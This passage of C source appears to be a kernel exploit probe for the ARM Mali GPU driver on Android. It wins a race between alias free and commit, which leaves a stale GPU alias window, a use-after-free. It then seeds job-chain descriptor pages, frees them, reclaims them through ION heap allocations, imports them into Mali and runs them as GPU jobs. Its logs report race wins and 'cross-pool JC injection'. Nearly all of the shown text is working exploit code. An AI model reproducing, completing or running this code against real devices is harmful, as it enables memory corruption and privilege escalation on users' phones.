    if (shrink_with_alias == 0 || shrink_without_alias != 0 || commit_now != SOURCE_OFFSET_PAGES)
        return -1;

    if (verify_control_submit(fd) < 0)
        return -1;

    return verify_ion_import_baseline(fd, ion_fd);
}

/* ── Main per-iteration attempt ──────────────────────────────────────────── */

static int run_ion_consumer_attempt(int fd, int ion_fd, int iter,
                                    struct attempt_result *result)
{
    uint64_t native_va = 0;
    uint64_t alias_va = 0;
    uint64_t guard_va = 0;
    uint64_t dest_va = 0;
    uint64_t import_gpu_va = 0;
    uint8_t *native_cpu = MAP_FAILED;
    uint64_t *dest_cpu = MAP_FAILED;
    struct mapped_alloc reclaim_slot;
    size_t reclaim_page_index = 0;
    uint8_t seed_source_id = SOURCE_ID_NONE;
    int ion_dma_fd = -1;
    ion_user_handle_t ion_handle = -1;
    void *ion_map = MAP_FAILED;
    int t;
    int rc = 0;

    memset(result, 0, sizeof(*result));
    memset(&reclaim_slot, 0, sizeof(reclaim_slot));

    /* 1. Native region ─────────────────────────────────────────────────── */
    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va) {
        printf("[-] iter %d: native alloc failed\n", iter);
        return -1;
    }
    native_cpu = mali_cpu_map(fd, native_va, NATIVE_PAGES * PAGE_BYTES);
    if (native_cpu == MAP_FAILED) {
        printf("[-] iter %d: native mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    fill_source_tags(native_cpu);
    __sync_synchronize();

    /* 2. Alias ─────────────────────────────────────────────────────────── */
    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        printf("[-] iter %d: alias failed\n", iter);
        rc = -1;
        goto cleanup;
    }

    /* 3. Race ──────────────────────────────────────────────────────────── */
    g_fd = fd;
    g_native_gpu_va = native_va;
    g_alias_gpu_va = alias_va;
    g_commit_ret = -1;
    g_ready = 0;

    {
        pthread_t t_free, t_commit;

        pthread_create(&t_free, NULL, thread_free, NULL);
        pthread_create(&t_commit, NULL, thread_commit, NULL);
        usleep(iter % 7);
        g_ready = 1;
        pthread_join(t_free, NULL);
        pthread_join(t_commit, NULL);
    }
    alias_va = 0;

    if (g_commit_ret != 0) {
        printf("[*] iter %d: race miss (commit ret=%d)\n", iter, g_commit_ret);
        goto cleanup;
    }

    result->race_won = 1;
    printf("[!!!] iter %d: race won (commit_now=%llu old_alias=0x%llx)\n",
           iter,
           (unsigned long long)mali_query_commit(fd, native_va),
           (unsigned long long)g_alias_gpu_va);

    /* 4. Reserve stale alias window ────────────────────────────────────── */
    if (!reserve_alias_window(fd, g_alias_gpu_va, &guard_va)) {
        printf("[*] iter %d: failed to pin stale alias window\n", iter);
        goto cleanup;
    }
    result->reserved_window = 1;
    printf("[+] iter %d: reserved stale alias window at 0x%llx\n",
           iter, (unsigned long long)guard_va);

    /* 5. Allocate target buffer ─────────────────────────────────────────── */
    dest_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                   BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                   BASE_MEM_COHERENT_LOCAL);
    if (!dest_va) {
        printf("[-] iter %d: dest alloc failed\n", iter);
        rc = -1;
        goto cleanup;
    }
    dest_cpu = mali_cpu_map(fd, dest_va, PAGE_BYTES);
    if (dest_cpu == MAP_FAILED) {
        printf("[-] iter %d: dest mmap failed errno=%d\n", iter, errno);
        rc = -1;
        goto cleanup;
    }
    dest_cpu[0] = DEST64;

    /* 6. Find reclaim candidate ─────────────────────────────────────────── */
    rc = find_disjoint_reclaim_candidate(fd, g_alias_gpu_va, &reclaim_slot,
                                         &result->reclaim_alloc_index);
    if (rc <= 0) {
        printf("[*] iter %d: no disjoint reclaim candidate (%d)\n", iter, rc);
        rc = (rc < 0) ? -1 : 0;
        goto cleanup;
    }

    if (!select_source_page(reclaim_slot.source_ids, RECLAIM_PAGES,
                            &seed_source_id, &reclaim_page_index)) {
        printf("[-] iter %d: no selectable tagged page in reclaim candidate\n", iter);
        rc = -1;
        goto cleanup;
    }

    /* 7. Seed and free ──────────────────────────────────────────────────── */
    seed_descriptor_page(reclaim_slot.cpu +
                             reclaim_page_index * (PAGE_BYTES / sizeof(uint64_t)),
                         dest_va, seed_source_id);
    result->reclaim_seeded = 1;
    result->seed_page_index = reclaim_page_index;
    result->seed_source_id = seed_source_id;
    printf("[+] iter %d: seeded reclaim alloc=%d page=%zu source=%u target_dest=0x%llx\n",
           iter, result->reclaim_alloc_index, reclaim_page_index,
           seed_source_id, (unsigned long long)dest_va);

    free_mapped_region(fd, &reclaim_slot);
    /* Physical pages should now be returned to the page allocator pool. */

    /* 8-10. Try to capture seeded page via fresh ION allocations ─────────── */
    for (t = 0; t < MAX_ION_TRIES; t++) {
        const uint64_t *page_cpu;

        if (ion_alloc_one_page(ion_fd, &ion_dma_fd, &ion_handle, &ion_map) < 0) {
            printf("[*] iter %d: ION alloc try=%d failed errno=%d\n", iter, t, errno);
            break;
        }

        page_cpu = (const uint64_t *)ion_map;

        printf("[*] iter %d: ION try=%d page[16]=0x%016llx page[17]=0x%016llx\n",
               iter, t,
               (unsigned long long)page_cpu[JC_SENTINEL_WORD],
               (unsigned long long)page_cpu[JC_SENTINEL_WORD + 1]);

        if (page_has_sentinel(page_cpu)) {
            uint8_t found_id = (uint8_t)(page_cpu[JC_SENTINEL_WORD + 1] & 0xFFU);

            printf("[!!!] iter %d: SENTINEL FOUND at ION try=%d source_id=%u\n",
                   iter, t, found_id);
            result->ion_sentinel_found = 1;
            result->ion_try_index = t;

            /* Import this ION page into Mali without overwriting any content. */
            import_gpu_va = mali_import_ion(fd, &ion_dma_fd);
            if (!import_gpu_va) {
                printf("[-] iter %d: MEM_IMPORT failed after sentinel find\n", iter);
                rc = 0;
                goto cleanup;
            }

            /* Submit import_gpu_va as JC with extres (required for imported-page JC). */
            if (submit_jc_extres(fd, import_gpu_va, 0x42, import_gpu_va,
                                 &result->execute_event) < 0) {
                printf("[-] iter %d: ION JC submit failed\n", iter);
                rc = 0;
                goto cleanup;
            }

            printf("[*] iter %d: ION JC event=%s dest=0x%016llx\n",
                   iter, event_name(result->execute_event),
                   (unsigned long long)dest_cpu[0]);

            if (result->execute_event == BASE_JD_EVENT_DONE && dest_cpu[0] == 0) {
                result->execute_hit = 1;
                printf("[!!!] CROSS-POOL ION CONSUMER CONFIRMED\n");
                printf("      Seeded alias-race page reclaimed by ION system heap,\n");
                printf("      imported into Mali, and executed as JC without overwrite.\n");
                printf("      source_id=%u seed_page=%zu ion_try=%d\n",
                       seed_source_id, reclaim_page_index, t);
                rc = 1;
                goto cleanup;
            }

            printf("[*] iter %d: sentinel found + imported but GPU result unexpected\n", iter);
            rc = 0;
            goto cleanup;
        }

        /* No sentinel — free this ION page and try the next one. */
        ion_free_one_page(ion_fd, ion_dma_fd, ion_handle, ion_map);
        ion_dma_fd = -1;
        ion_handle = -1;
        ion_map = MAP_FAILED;
    }

    if (!result->ion_sentinel_found) {
        printf("[*] iter %d: seeded page NOT captured by %d ION allocs "
               "(pools may be disjoint)\n", iter, MAX_ION_TRIES);
    }
    rc = 0;

cleanup:
    if (import_gpu_va)
        mali_free(fd, import_gpu_va);
    if (ion_map != MAP_FAILED && ion_map != NULL)
        ion_free_one_page(ion_fd, ion_dma_fd, ion_handle, ion_map);
    free_mapped_region(fd, &reclaim_slot);
    if (dest_cpu != MAP_FAILED)
        munmap(dest_cpu, PAGE_BYTES);
    if (dest_va)
        mali_free(fd, dest_va);
    if (guard_va)
        mali_free(fd, guard_va);
    if (alias_va)
        mali_free(fd, alias_va);
    if (native_cpu != MAP_FAILED)
        munmap(native_cpu, NATIVE_PAGES * PAGE_BYTES);
    if (native_va)
        mali_free(fd, native_va);
    return rc;
}

/* ── Top-level probe driver ──────────────────────────────────────────────── */

static void run_probe(void)
{
    int i;
    int ion_fd = -1;
    int race_wins = 0;
    int seed_hits = 0;
    int ion_hits = 0;
    int execute_hits = 0;

    printf("=== mali_alias_ion_cross_pool_probe ===\n");
    printf("Tests whether the Mali page allocator and ION system-heap share\n");
    printf("the same physical page pool, enabling cross-pool JC injection.\n\n");

    ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
    if (ion_fd < 0) {
        perror("open /dev/ion");
        return;
    }

    g_fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (g_fd < 0) {
        perror("open /dev/mali0");
        close(ion_fd);
        return;
    }
    if (mali_init(g_fd) < 0) {
        perror("mali_init");
        close(g_fd);
        close(ion_fd);
        return;
    }

    if (verify_prereqs(g_fd, ion_fd) < 0) {
        printf("[-] prereqs failed: alias race, baseline WRITE_VALUE, or ION import did not pass\n");
        close(g_fd);
        close(ion_fd);
        return;
    }
    printf("[+] prereqs PASSED\n\n");

    for (i = 1; i <= MAX_RACE_ITERS; i++) {
        struct attempt_result result;
        int rc = run_ion_consumer_attempt(g_fd, ion_fd, i, &result);

        if (result.race_won)
            race_wins++;
        if (result.reclaim_seeded)
            seed_hits++;
        if (result.ion_sentinel_found)
            ion_hits++;
        if (result.execute_hit)
            execute_hits++;

        printf("[iter %d] race=%d seed=%d ion_sentinel=%d execute=%d event=0x%x\n\n",
               i, result.race_won, result.reclaim_seeded,
               result.ion_sentinel_found, result.execute_hit, result.execute_event);

        if (rc < 0)
            break;
        if (result.execute_hit)
            break;
    }

    printf("=== Summary ===\n");
    printf("race_wins=%d seed_hits=%d ion_sentinel_hits=%d execute_hits=%d / %d iters\n",
           race_wins, seed_hits, ion_hits, execute_hits, MAX_RACE_ITERS);

    if (ion_hits == 0)
        printf("CONCLUSION: pools appear DISJOINT — seeded Mali pages never appeared in ION allocs\n");
    else if (execute_hits > 0)
        printf("CONCLUSION: pools are SHARED — cross-pool ION JC injection CONFIRMED\n");
    else
        printf("CONCLUSION: sentinel found in ION but GPU did not execute seeded descriptor\n");

    close(g_fd);
    close(ion_fd);
}

int main(void)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }
    if (pid == 0) {
        alarm(15);
        run_probe();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("probe killed by signal %d\n", WTERMSIG(status));
    return 0;
}
